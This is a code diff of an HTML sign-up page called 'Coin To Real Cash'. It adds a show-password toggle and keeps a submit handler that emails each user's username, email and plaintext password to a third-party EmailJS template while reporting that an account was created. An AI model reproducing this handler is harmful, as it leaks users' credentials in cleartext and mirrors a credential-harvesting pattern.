@@ -22,10 +22,11 @@
             margin: 30px 0px;
 
         }
+        
     </style>
 </head>
 <body>
-    <div class="header-banner">
+   <div class="header-banner">
         <h1>Coin To Real Cash</h1>
     </div>
 
@@ -46,6 +47,12 @@
             <div class="input-group">
                 <input type="password" placeholder="Confirm Password" id="confirm-password" required>
             </div>
+            
+            <div class="form-group-checkbox">
+                <input type="checkbox" id="showAllPasswordsToggle">
+                <label for="showAllPasswordsToggle">Show Passwords</label>
+            </div>
+
             <div class="account-btn">
                 <button type="submit" class="create-account-btn">Create Account</button>
             </div>
@@ -54,32 +61,51 @@
         <p class="signin-link">Already have an account? <a href="Login page.html">Login here</a></p>
     </div>
 <script>
-        document.getElementById('registration-form').addEventListener('submit', function(e) {
-            e.preventDefault();
+    // START: ADDED JAVASCRIPT FOR SHOW/HIDE PASSWORD
+    document.addEventListener('DOMContentLoaded', function() {
+        const passwordField = document.getElementById('password');
+        const confirmPasswordField = document.getElementById('confirm-password');
+        const showPasswordToggle = document.getElementById('showAllPasswordsToggle');
 
-            const username = document.getElementById('username').value;
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-            const confirmPassword = document.getElementById('confirm-password').value;
-
-            if (password !== confirmPassword) {
-                alert("Passwords do not match!");
-                return;
-            }
-
-            // Send email using EmailJS
-            emailjs.send("service_dndq44b", "template_6im86kh", {
-                user_name: username,
-                email: email,
-                password: password
-            })
-            .then(function(response) {
-                alert("Account created successfully!");
-                window.location.href = "Login page.html"; // Redirect to login
-            }, function(error) {
-                alert("Failed to send account info: " + JSON.stringify(error));
-            });
+        // Add an event listener to the single checkbox
+        showPasswordToggle.addEventListener('change', function() {
+            
+            // Determine the new type based on the checkbox state: 'text' if checked, 'password' if unchecked
+            const newType = showPasswordToggle.checked ? 'text' : 'password';
+            
+            // Apply the new type to BOTH password fields
+            passwordField.type = newType;
+            confirmPasswordField.type = newType;
         });
+    });
+    // END: ADDED JAVASCRIPT FOR SHOW/HIDE PASSWORD
+
+    document.getElementById('registration-form').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const username = document.getElementById('username').value;
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        const confirmPassword = document.getElementById('confirm-password').value;
+
+        if (password !== confirmPassword) {
+            alert("Passwords do not match!");
+            return;
+        }
+
+        // Send email using EmailJS
+        emailjs.send("service_dndq44b", "template_6im86kh", {
+            user_name: username,
+            email: email,
+            password: password
+        })
+        .then(function(response) {
+            alert("Account created successfully!");
+            window.location.href = "Login page.html"; // Redirect to login
+        }, function(error) {
+            alert("Failed to send account info: " + JSON.stringify(error));
+        });
+    });
     </script>
 </body>
 </html>
